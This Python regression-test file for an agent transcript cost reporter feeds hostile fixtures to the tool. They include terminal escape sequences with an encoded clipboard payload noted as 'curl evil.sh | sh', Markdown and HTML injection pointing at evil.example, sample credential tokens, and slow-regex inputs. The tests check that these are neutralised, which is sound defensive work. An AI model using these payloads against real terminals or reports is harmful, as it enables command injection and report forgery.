"""Regression tests for hostile transcript content.

A transcript is untrusted input: a shared .jsonl, or tool inputs an agent
copied out of a cloned repo or a fetched page. None of it may drive the
terminal, inject Markdown, or carry a common credential shape into a
shareable report, and no single line may stall the parser.
"""

from __future__ import annotations

import json
import re
import time
from pathlib import Path
from types import SimpleNamespace

from agent_cost import cli
from agent_cost.cli import main
from agent_cost.parser import parse_transcript
from tests.conftest import asst_text, asst_tool, tool_result, usage, write_jsonl

ESC, BEL = "\x1b", "\x07"
OSC52 = ESC + "]52;c;Y3VybCBldmlsLnNoIHwgc2g=" + BEL  # clipboard <- curl evil.sh | sh
# the terminal escapes a transcript can smuggle in, as they would reach a tty
HOSTILE = (ESC + "]", ESC + "[1A", ESC + "[2K", ESC + "[31m", ESC + "[5m",
           BEL, "\u202e")


# ---- terminal escape injection ----------------------------------------------


def _hostile_terminal_transcript(tmp_path):
    cmd = OSC52 + ESC + "[2K" + "echo hi"
    path = ("/repo/" + ESC + "[1A" + ESC + "[2K  TOTAL EST. COST  $0.01"
            + ESC + "]0;pwned" + BEL + "\u202e" + "big.txt")
    records = []
    for i in range(3):
        records.append(asst_tool(f"L{i}", "Bash", {"command": cmd},
                                 usage=usage(inp=1000, out=10)))
        records.append(tool_result(f"L{i}", "err", is_error=True))
    records.append(asst_tool("R", "Read", {"file_path": path},
                             usage=usage(inp=1000, out=10)))
    records.append(tool_result("R", "x" * 5000))
    records.append(asst_text("done", model="model" + ESC + "[5mX",
                             usage=usage(inp=10, out=10)))
    records[0]["cwd"] = "/p" + ESC + "]0;CWD-TITLE" + BEL
    records[0]["slug"] = "s" + ESC + "[31mSLUG"
    return write_jsonl(tmp_path / "evil.jsonl", records)


def test_terminal_report_does_not_emit_transcript_escapes(tmp_path, capsys):
    transcript = _hostile_terminal_transcript(tmp_path)
    assert main(["report", transcript, "--no-color"]) == 0
    out = capsys.readouterr().out
    for seq in HOSTILE:
        assert seq not in out, f"raw {seq!r} reached the terminal"
    assert ESC not in out  # --no-color: not one escape byte at all
    # the smuggled bytes are shown, not obeyed, so the reader can see them
    assert "\\x1b]52;c;" in out
    assert "\\u202e" in out
    assert "echo hi" in out and "big.txt" in out


def test_colored_report_keeps_own_styles_but_not_transcript_escapes(tmp_path):
    from agent_cost.cli import analyze_cost
    from agent_cost.report import render_terminal

    out = render_terminal(analyze_cost(_hostile_terminal_transcript(tmp_path)),
                          color=True)
    assert "\x1b[1m" in out  # the report's own bold still works
    for seq in (ESC + "]", ESC + "[1A", ESC + "[2K", ESC + "[5m", BEL, "\u202e"):
        assert seq not in out


def test_total_escapes_model_ids(tmp_path, monkeypatch, capsys):
    records = [asst_text("hi", model="m" + ESC + "]0;t" + BEL + ESC + "[2J",
                         usage=usage(inp=10, out=10))]
    transcript = Path(write_jsonl(tmp_path / "t.jsonl", records))
    monkeypatch.setattr(cli, "discover_transcripts", lambda _f=None: [transcript])
    assert main(["total", "--no-color"]) == 0
    out = capsys.readouterr().out
    assert ESC not in out and BEL not in out
    assert "\\x1b]0;t" in out


def test_top_and_list_escape_transcript_file_names(simple_transcript, monkeypatch,
                                                   capsys):
    real = Path(simple_transcript)
    odd = Path("proj" + ESC + "]0;t" + BEL) / ("ab" + ESC + "[2Jcdefgh.jsonl")
    monkeypatch.setattr(cli, "discover_transcripts", lambda _f=None: [odd])
    monkeypatch.setattr(cli, "parse_transcript", lambda _p: parse_transcript(real))
    assert main(["top"]) == 0
    out = capsys.readouterr().out
    assert ESC not in out and BEL not in out
    assert "\\x1b[2J" in out

    stand_in = SimpleNamespace(stem=odd.stem, parent=SimpleNamespace(
        name=odd.parent.name), stat=real.stat)
    monkeypatch.setattr(cli, "discover_transcripts", lambda _f=None: [stand_in])
    assert main(["list"]) == 0
    out = capsys.readouterr().out
    assert ESC not in out and BEL not in out
    assert "\\x1b]0;t" in out


# ---- Markdown / HTML injection ----------------------------------------------


_KNOWN_HEADINGS = {"# agent-cost report", "## ⚠ Runaway loops", "## Cost by model",
                   "## Top expensive turns", "## Context bloat offenders",
                   "## Cache efficiency"}


def test_markdown_report_neutralises_injected_markup(tmp_path):
    forged = "\n\n## Total est. cost: $0.00 (verified)\n"
    link = '\n\n<a href="https://evil.example">click</a>\n'
    records = [
        asst_tool("W", "WebFetch",
                  {"url": 'https://docs.example/<img src="https://evil.example/px.png">'},
                  usage=usage(inp=1000, out=10)),
        tool_result("W", "y" * 5000),
        asst_tool("R", "Read", {"file_path": "/repo/a.txt" + forged},
                  usage=usage(inp=1000, out=10)),
        tool_result("R", "z" * 6000),
        asst_tool("K", "WebFetch",
                  {"url": "https://docs.example/![x](https://evil.example/t.png)"
                          "[click](https://evil.example)"},
                  usage=usage(inp=1000, out=10)),
        tool_result("K", "k" * 5500),
        asst_tool("P", "Read", {"file_path": "C:\\docs\\[x\\](https://evil.example/p)"},
                  usage=usage(inp=1000, out=10)),
        tool_result("P", "p" * 4500),
        asst_tool("N", "WebFetch", {"url": "https://docs.example/a_b?x=1&y=2"},
                  usage=usage(inp=1000, out=10)),
        tool_result("N", "n" * 4000),
        asst_text("x", model="evil|model", usage=usage(inp=10, out=10)),
    ]
    for i in range(3):
        records.append(asst_tool(f"L{i}", "Read",
                                 {"file_path": "/repo/docs/README" + forged + link},
                                 usage=usage(inp=100, out=10)))
        records.append(tool_result(f"L{i}", "File does not exist.", is_error=True))
    for i in range(3):
        records.append(asst_tool(f"B{i}", "Bash",
                                 {"command": 'echo "`date`" && pytest -q'},
                                 usage=usage(inp=100, out=10)))
        records.append(tool_result(f"B{i}", "ok"))
    transcript = write_jsonl(tmp_path / "md.jsonl", records)
    out = tmp_path / "out.md"
    assert main(["report", transcript, "--md", str(out), "--json"]) == 0
    md = out.read_text(encoding="utf-8")
    lines = md.split("\n")

    # no forged heading: every heading line is one the report itself writes
    assert [ln for ln in lines if ln.startswith("#")
            and ln not in _KNOWN_HEADINGS] == []
    # raw HTML from a url never reaches the file as a tag
    assert "<img" not in md
    # no link or image syntax survives: every ']' before '(' is escaped, i.e.
    # preceded by an odd number of backslashes
    for match in re.finditer(r"(\\*)\]\(", md):
        assert len(match.group(1)) % 2 == 1, match.group(0)
    # an ordinary url is written as it is
    assert "| https://docs.example/a_b?x=1&y=2 |" in md
    # a backslash is escaped only where it would escape the next character
    assert "| C:\\docs\\\\\\[x\\\\\\](https://evil.example/p) |" in md
    # every row of every table stays one row
    in_table = False
    for ln in lines:
        if ln.startswith("|"):
            in_table = True
            assert ln.endswith("|"), ln
        elif in_table:
            assert ln == "", f"table row broken across lines: {ln!r}"
            in_table = False
    # a pipe in a model id cannot add a column
    assert "| `evil\\|model` (unpriced, tokens only) |" in md
    # the loop signature stays inside one code span on one line, so the link
    # and the heading in it are inert text
    sig_lines = [ln for ln in lines if "Read:/repo/docs/README" in ln]
    assert len(sig_lines) == 1
    assert sig_lines[0].startswith("  `") and sig_lines[0].endswith("`")
    assert "<a href" in sig_lines[0]
    # a backtick in a command cannot close the code span early
    assert '  ``Bash:echo "`date`" && pytest -q``' in lines


def _unescaped_backticks(line):
    """Backticks in `line` with no backslash escape, the ones that can open or
    close a code span."""
    return [m.start() for m in re.finditer(r"(\\*)`", line)
            if len(m.group(1)) % 2 == 0]


def test_markdown_backtick_in_tool_name_cannot_pair_with_a_code_span(tmp_path):
    from agent_cost.report import _md_text

    # A tool name 'X`' used to pair with the backtick inside the loop
    # signature's code span on the next line. That ended the span early and
    # the rest of the signature rendered as live HTML (a raw <img>).
    url = 'a<img src="https://evil.example/px.png">'
    records = []
    for i in range(3):
        records.append(asst_tool(f"X{i}", "X`", {"url": url},
                                 usage=usage(inp=1000, out=10)))
        records.append(tool_result(f"X{i}", "q" * 5000))
    transcript = write_jsonl(tmp_path / "bt.jsonl", records)
    out = tmp_path / "out.md"
    assert main(["report", transcript, "--md", str(out)]) == 0
    lines = out.read_text(encoding="utf-8").split("\n")

    header = [ln for ln in lines if ln.startswith("- **×3 ")]
    assert len(header) == 1
    assert header[0].startswith(r"- **×3 X\`**, ")
    # the signature is still one code span that nothing inside can close
    sig = lines[lines.index(header[0]) + 1]
    assert sig == '  ``X`:a<img src="https://evil.example/px.png">``'
    # the tool cell of the bloat table is escaped the same way
    rows = [ln for ln in lines if ln.startswith("| ") and "X" in ln]
    assert len(rows) == 3
    assert all(r" | X\` | " in ln for ln in rows), rows
    # where the tool name is written as prose, no backtick is left unescaped
    for ln in header + rows:
        assert _unescaped_backticks(ln) == [], ln

    assert _md_text("X`") == r"X\`"
    assert _md_text("a``b") == r"a\`\`b"
    # a backslash before a backtick is escaped too, so it cannot undo the escape
    assert _md_text(r"a\`b") == r"a\\\`b"


# ---- credentials copied into shareable reports ------------------------------

GH_TOKEN = "ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
SK_TOKEN = "sk-proj-abcdefghijklmnopqrstuvwxyz0123"


def _credential_transcript(tmp_path):
    records = []
    for i in range(3):
        records.append(asst_tool(
            f"L{i}", "Bash",
            {"command": f'curl -s -H "Authorization: Bearer {GH_TOKEN}" '
                        "https://api.github.com/repos/o/r/actions/runs"},
            usage=usage(inp=1000, out=10)))
        records.append(tool_result(f"L{i}", "queued"))
    records.append(asst_tool(
        "E", "Bash", {"command": f"export OPENAI_API_KEY={SK_TOKEN}; python run.py"},
        usage=usage(inp=1000, out=10)))
    records.append(tool_result("E", "o" * 20_000))
    return write_jsonl(tmp_path / "creds.jsonl", records)


def test_reports_do_not_carry_credentials(tmp_path, capsys):
    transcript = _credential_transcript(tmp_path)
    md_path = tmp_path / "out.md"
    assert main(["report", transcript, "--json", "--md", str(md_path)]) == 0
    json_out = capsys.readouterr().out
    assert main(["report", transcript, "--no-color"]) == 0
    term_out = capsys.readouterr().out
    md = md_path.read_text(encoding="utf-8")

    payload = json.loads(json_out)
    for text in (json_out, term_out, md):
        assert GH_TOKEN not in text and "A1b2C3d4" not in text
        assert SK_TOKEN not in text and "abcdefghij" not in text
    # the command is still recognisable
    assert payload["loops"][0]["signature"].startswith(
        'Bash:curl -s -H "Authorization: Bearer ***" https://api.github.com')
    assert payload["bloat_offenders"][0]["label"] == (
        "export OPENAI_API_KEY=***; python run.py")


def test_redact_secrets_masks_common_credential_shapes():
    from agent_cost.redact import redact_secrets

    cases = {
        'curl -H "Authorization: Basic dXNlcjpwYXNz" https://x.example':
            'curl -H "Authorization: Basic ***" https://x.example',
        "curl -H 'X-Api-Key: abc123def' https://x.example":
            "curl -H 'X-Api-Key: ***' https://x.example",
        "GITHUB_TOKEN=gho_16charactersormore python ci.py":
            "GITHUB_TOKEN=*** python ci.py",
        'mysql --password="hunter 2" -e "select 1"':
            'mysql --password=*** -e "select 1"',
        "mysql --password hunter2 db": "mysql --password *** db",
        "https://api.example/v1?api_key=abcd1234&page=2":
            "https://api.example/v1?api_key=***&page=2",
        '{"token": "abcd1234"}': '{"token": ***}',
        "psql postgres://admin:s3cr3t@db.internal:5432/app":
            "psql postgres://admin:***@db.internal:5432/app",
        "curl -u admin:s3cr3t https://x.example":
            "curl -u admin:*** https://x.example",
        "git clone https://ghp_abcdefghijklmnopqrstuvwxyz0123456789@github.com/o/r":
            "git clone https://ghp_***@github.com/o/r",
        "echo github_pat_11ABCDEFG0123456789_abcdefghijklmnop":
            "echo github_pat_***",
        "anthropic sk-ant-api03-abcdefghijklmnopqrstuvwx": "anthropic sk-***",
        "aws s3 ls # AKIAIOSFODNN7EXAMPLE": "aws s3 ls # AKIA***",
        "stripe sk_live_abcdefghijklmnop": "stripe sk_live_***",
        "slack xoxb-1234567890-abcdefghij": "slack xoxb-***",
        "gitlab glpat-abcdefghijklmnopqrst": "gitlab glpat-***",
    }
    for raw, expected in cases.items():
        assert redact_secrets(raw) == expected, raw

    # ordinary commands, paths and urls pass through untouched
    for plain in ("python -m pytest tests/test_billing.py -q",
                  "git log --pretty=format:%h -n 5",
                  "C:\\fake\\project\\big.py",
                  "/home/dev/acme-api/src/generated/schema.py",
                  "https://docs.example/guide?page=2&lang=en",
                  "ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519",
                  "python train.py --tokenizer=bert-base",
                  "git push -u origin main",
                  "Bash", "claude-opus-5[1m]"):
        assert redact_secrets(plain) == plain, plain


def test_redact_secrets_is_linear_on_adversarial_input():
    from agent_cost.redact import redact_secrets

    n = 60_000
    shapes = ("key" * n, "key=" * n, "key:\"" * n, "a://x:" * n, "-u " * n,
              " -u=" * n, "sk-" * n, "Bearer " * n, "authorization: " * n,
              "authorization:" + " " * n, "x" * n + "@", "a.a" * n + "://",
              "key" + " " * n + "x", "ghp_" * n, "[" * n)
    for text in shapes:
        start = time.perf_counter()
        redact_secrets(text)
        elapsed = time.perf_counter() - start
        assert elapsed < 2.0, (text[:20], elapsed)


def test_redact_secrets_leaves_ordinary_assignments_alone():
    from agent_cost.redact import redact_secrets

    # A short value after a bare 'key', a name that only ends in the letters
    # 'key', a branch named sk-something and prose that mentions an API key.
    for plain in ("sort --key=2 data.txt",
                  "echo monkey=banana",
                  "git checkout feature/sk-login",
                  'git commit -m "Rotate API key: see docs"',
                  "python -c \"d={'key': 1}\"",
                  "echo turkey=AbCdEf0123456789xyz",
                  "open --key=/etc/ssl/private/server.key",
                  "python train.py --tokens=4096"):
        assert redact_secrets(plain) == plain, plain


def test_redact_secrets_narrowed_rule_still_masks_real_credentials():
    from agent_cost.redact import redact_secrets

    cases = {
        # a bare 'key' is masked once its value looks generated
        "curl https://x.example/v1?key=AbCdEf0123456789xyz&page=2":
            "curl https://x.example/v1?key=***&page=2",
        '{"key": "AbCdEf0123456789+/=="}': '{"key": ***}',
        # the name list, matched on the end of the name
        "MYSQL_PWD=hunter2 mysql -u root": "MYSQL_PWD=*** mysql -u root",
        "PGPASSWORD=hunter2 psql": "PGPASSWORD=*** psql",
        "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY aws s3 ls":
            "AWS_SECRET_ACCESS_KEY=*** aws s3 ls",
        '{"privateKey": "abc", "clientSecret": "def"}':
            '{"privateKey": ***, "clientSecret": ***}',
        '{"auth": "u:p", "credentials": "x"}': '{"auth": ***, "credentials": ***}',
        "X-Auth-Token: abc123": "X-Auth-Token: ***",
        "user=bob,password=hunter2": "user=bob,password=***",
        # a token prefix counts only with 12 or more token characters after it
        "sk-" + "a" * 16: "sk-***",
        "ghp_" + "a" * 16: "ghp_***",
        "xoxb-" + "1" * 16: "xoxb-***",
        "sk_live_" + "a" * 16: "sk_live_***",
    }
    for raw, expected in cases.items():
        assert redact_secrets(raw) == expected, raw

    for short in ("sk-" + "a" * 11, "ghp_" + "a" * 11, "xoxb-" + "1" * 11,
                  "github_pat_" + "a" * 11, "sk_live_" + "a" * 11,
                  "key=" + "a" * 15):
        assert redact_secrets(short) == short, short


def test_narrowed_redaction_is_linear_on_adversarial_input():
    from agent_cost.redact import redact_secrets

    n = 60_000
    shapes = ("key=" * n + ".", "=key:" * n, "+key=" * n + "!", "api_" * n,
              "-" * n + "key=x", "token" * n, "a" * n + "_token",
              "passw" * n, "credential" * n + "s", "private_" * n + "key",
              "sk-" + "a" * n + "!", "key= " * n, "key=\"" * n)
    for text in shapes:
        start = time.perf_counter()
        redact_secrets(text)
        elapsed = time.perf_counter() - start
        assert elapsed < 2.0, (text[:20], elapsed)


def test_final_redaction_rule_required_cases():
    from agent_cost.redact import redact_secrets

    # a credential name masks any value that is not none, null, true, false
    # or a number, however short it is
    masked = {
        "export SECRET_KEY=django-insecure-abc": "export SECRET_KEY=***",
        "ENCRYPTION_KEY=0123456789abcdef0123": "ENCRYPTION_KEY=***",
        "mysql --password hunter2": "mysql --password ***",
        '"clientSecret": "s3cr3t"': '"clientSecret": ***',
        "accessToken=abc123": "accessToken=***",
        "Authorization: Bearer x": "Authorization: Bearer ***",
        "PWD=pa55": "PWD=***",
        # PWD in an ODBC connection string
        "Driver={ODBC Driver 18 for SQL Server};Server=db;UID=sa;PWD=pa55;":
            "Driver={ODBC Driver 18 for SQL Server};Server=db;UID=sa;PWD=***;",
    }
    for raw, expected in masked.items():
        assert redact_secrets(raw) == expected, raw

    for plain in ("sort --key=2 data.txt",
                  "echo monkey=banana",
                  "git checkout feature/sk-login",
                  'git commit -m "auth: fix login redirect"',
                  "docker run -v $PWD:/app node",
                  "--max-token=4096",
                  "CACHE_KEY=build-v2",
                  'git commit -m "Rotate API key: see docs"'):
        assert redact_secrets(plain) == plain, plain


def test_final_redaction_rule_names_forms_and_values():
    from agent_cost.redact import redact_secrets

    masked = {
        # camelCase and acronym boundaries split a name into words
        "apiKey=abc": "apiKey=***",
        "APIKey: abc": "APIKey: ***",
        '{"signingKey": "k1", "masterKey": "k2", "sessionKey": "k3"}':
            '{"signingKey": ***, "masterKey": ***, "sessionKey": ***}',
        "client_key=abc session.key=def": "client_key=*** session.key=***",
        "OPENAI_APIKEY=x": "OPENAI_APIKEY=***",
        "GPG_PASSPHRASE='two words'": "GPG_PASSPHRASE=***",
        "db.password=x": "db.password=***",
        # every form: =, :, JSON, --flag=value, --flag value, -flag value
        "TOKEN=t": "TOKEN=***",
        "secret: s": "secret: ***",
        "{'credential': 'c'}": "{'credential': ***}",
        "--auth-token=a1": "--auth-token=***",
        "--client-secret s": "--client-secret ***",
        "-password p": "-password ***",
        # auth is masked in every form but the unquoted `auth: text` of a
        # commit message, and there too once the value looks generated
        "auth=fix": "auth=***",
        '{"auth": "fix"}': '{"auth": ***}',
        "--auth fix": "--auth ***",
        "X-Auth: abc123": "X-Auth: ***",
        "auth: dXNlcjpwYXNzd29yZA==": "auth: ***",
        # an Authorization header value is masked whatever it is
        "Authorization: Basic 0": "Authorization: Basic ***",
        # a value that only starts with a number is not a number
        "PASSWORD=1234abcd": "PASSWORD=***",
        # Go and Python := assignments, and brackets around a value
        'password := "hunter2"': "password := ***",
        '{"token": abc123}': '{"token": ***}',
        "token=${TOKEN}": "token=***",
        # JSON inside a double-quoted shell string
        r'curl -d "{\"password\": \"hunter2\", \"user\": \"bob\"}"':
            r'curl -d "{\"password\": ***, \"user\": \"bob\"}"',
    }
    for raw, expected in masked.items():
        assert redact_secrets(raw) == expected, raw

    for plain in (
            # none, null, true, false and numbers are settings, not secrets
            "--password=true", "TOKEN=null", '{"secret": false}',
            "PASSWORD=None", "--max-token 4096", "token_limit=1.5",
            "retry_token=-1", '{"token": null}', "TOKEN=0", 'TOKEN=""',
            # after $ or ${ the variable is being read, not assigned
            "echo ${TOKEN:-unset}", "cd $PWD && ls", "echo $SECRET_KEY:$HOME",
            # words are whole words: none of these is a credential name
            "author=bob", "keyboard=us", "OLDPWD=/tmp", "tokens=5",
            "passport=X1234567", "hotkey=ctrl+k",
            # a bare key with a short or path-like value
            "sort_key=name", "sort --key 2", "KEY_ID=abc",
            # a comparison is not an assignment
            "if token == expected", "let t = Token::new(x)",
            # a flag followed by another flag or a redirect has no value
            "docker login --password-stdin -u me",
            "gh auth login --with-token < token.txt",
    ):
        assert redact_secrets(plain) == plain, plain


def test_final_redaction_token_prefixes_need_12_characters():
    from agent_cost.redact import redact_secrets

    twelve, eleven = "a1B2_c3-D4e5", "a1B2_c3-D4e"
    for prefix in ("sk-", "sk_live_", "sk_test_", "rk_", "ghp_", "gho_", "ghu_",
                   "ghs_", "ghr_", "github_pat_", "glpat-", "xoxa-", "xoxb-",
                   "xoxp-", "xoxr-", "xoxs-", "AIza", "AKIA", "ASIA"):
        assert redact_secrets("x " + prefix + twelve + " y") == (
            "x " + prefix + "*** y"), prefix
        short = "x " + prefix + eleven + " y"
        assert redact_secrets(short) == short, prefix


def test_final_redaction_is_linear_on_adversarial_input():
    from agent_cost.redact import redact_secrets

    n = 60_000
    shapes = ("a=" * n, "aB" * n + "=x", "aKey" * n + "=x", "$PWD:" * n,
              "${TOKEN:" * n, "--password " * n, "-x " * n,
              "--token" + " " * n + "-x", "auth: " * n, "PWD=" * n,
              "token=" + "0" * n + "x", "Token" * n + ":", "x" * n + "Token=abc",
              "token: bearer " * n, '"token": ' * n, "sk_live_" * n,
              "rk_" * n + "!", "AKIA" * n, "token=null," * n,
              "key=" + "a" * n + ".", "password==" * n, "x-api-key: " * n,
              '\\"token\\": ' * n, 'token=\\"' * n)
    for text in shapes:
        start = time.perf_counter()
        redact_secrets(text)
        elapsed = time.perf_counter() - start
        assert elapsed < 2.0, (text[:20], elapsed)


def test_redaction_leaves_authorization_references_alone():
    from agent_cost.redact import redact_secrets

    # after $ or ${ Authorization is a variable being read, as for any name
    for plain in ("$AUTHORIZATION:/app", "${AUTHORIZATION:-none}",
                  "docker run -v $AUTHORIZATION:/app node",
                  "echo ${AUTHORIZATION:-none}", "echo $Authorization=x"):
        assert redact_secrets(plain) == plain, plain
    # the header value is still masked, and so is a Bearer token in a default
    masked = {
        "curl -H 'Authorization: Bearer abc123' https://x.example":
            "curl -H 'Authorization: Bearer ***' https://x.example",
        "authorization=abc123": "authorization=***",
        'curl -H "Authorization: $TOKEN"': 'curl -H "Authorization: ***"',
    }
    for raw, expected in masked.items():
        assert redact_secrets(raw) == expected, raw
    out = redact_secrets("echo ${AUTHORIZATION:-Bearer abc123}")
    assert out.startswith("echo ${AUTHORIZATION:-Bearer ***"), out
    assert "abc123" not in out


def test_kept_value_is_scanned_again_for_credentials():
    from agent_cost.redact import redact_secrets

    # A value the rule keeps is scanned again, so an unclosed quote or a long
    # unquoted value cannot hide a credential written after it or inside it.
    masked = {
        'git commit -m "doc: key=\'s default" && export API_TOKEN=abcd1234':
            'git commit -m "doc: key=\'s default" && export API_TOKEN=***',
        'echo "sort key=\'" && export GITHUB_TOKEN=abcd1234 && gh pr list':
            'echo "sort key=\'" && export GITHUB_TOKEN=*** && gh pr list',
        "jq '.key=\"a b' cfg.json && PGPASSWORD=hunter2 psql":
            "jq '.key=\"a b' cfg.json && PGPASSWORD=*** psql",
        'sort --key "unterminated && export TOKEN=abc123':
            'sort --key "unterminated && export TOKEN=***',
        "CACHE_KEY='v2 && export DB_PASSWORD=abc123":
            "CACHE_KEY='v2 && export DB_PASSWORD=***",
        'git commit -m "auth: \'quoted" && export TOKEN=abc123':
            'git commit -m "auth: \'quoted" && export TOKEN=***',
        "curl https://x.example/?key=v1/token=abc123":
            "curl https://x.example/?key=v1/token=***",
    }
    for raw, expected in masked.items():
        out = redact_secrets(raw)
        assert out == expected, raw
        for secret in ("abcd1234", "hunter2", "abc123"):
            assert secret not in out, raw

    # what the second scan reads is judged by the same rule
    for plain in ("sort --key 'k1,1 -k2,2' data.txt",
                  "git commit -m \"key: 'see docs' and more\"",
                  "jq '.key=\"a b' cfg.json && echo done",
                  "curl https://x.example/?key=v1/page=2",
                  "CACHE_KEY='v2 && export MAX_TOKEN=4096"):
        assert redact_secrets(plain) == plain, plain


def test_second_scan_is_linear_on_adversarial_input():
    from agent_cost.redact import redact_secrets

    # Values that start inside one another and all run to the same end: a
    # second scan that read each of them to its end would be quadratic.
    n = 30_000
    shapes = ("key=" * n + ".", "key=" * n + "\\" * n + ".",
              'key="' + "key:" * n, "x=key=" * n + "!", "key=v1/" * n + ".",
              "--key " + "key=" * n + ".", "auth: " + "key=" * n + ".",
              "key=" + "-key=" * n + ".", "key=" + "+/key=" * n + ".",
              "aKey=" * n + ".", "key==" * n + ".", "token=1 " * n,
              'token="1"' * n, "key='" * n, "key=\\\"'" * n, "\"key='" * n,
              "key: " * n + "!", "$AUTHORIZATION:" * n,
              "${AUTHORIZATION:-" * n)
    for text in shapes:
        start = time.perf_counter()
        redact_secrets(text)
        elapsed = time.perf_counter() - start
        assert elapsed < 2.0, (text[:20], elapsed)


# ---- slow regex on the model id ---------------------------------------------


def test_normalize_model_is_linear_on_unclosed_brackets():
    from agent_cost.pricing import lookup_rate, normalize_model

    for model in ("[" * 150_000, "[" + "a" * 150_000, "[a" * 75_000):
        start = time.perf_counter()
        normalize_model(model)
        lookup_rate(model)
        elapsed = time.perf_counter() - start
        assert elapsed < 2.0, (model[:10], elapsed)
    # the suffixes it exists to strip are still stripped
    assert normalize_model("claude-opus-5[1m]") == "claude-opus-5"
    assert normalize_model("claude-haiku-4-5-20251001[1m]") == "claude-haiku-4-5"
    assert normalize_model("claude-sonnet-4-5") == "claude-sonnet-4-5"


def test_report_on_huge_bracket_model_finishes(tmp_path, capsys):
    records = [asst_text("hi", model="[" * 60_000, usage=usage(inp=1, out=1))]
    transcript = write_jsonl(tmp_path / "redos.jsonl", records)
    start = time.perf_counter()
    assert main(["report", transcript, "--json"]) == 0
    assert time.perf_counter() - start < 5.0
    payload = json.loads(capsys.readouterr().out)
    assert payload["has_unknown_rates"] is True
    assert re.fullmatch(r"\[+", payload["by_model"][0]["model"])
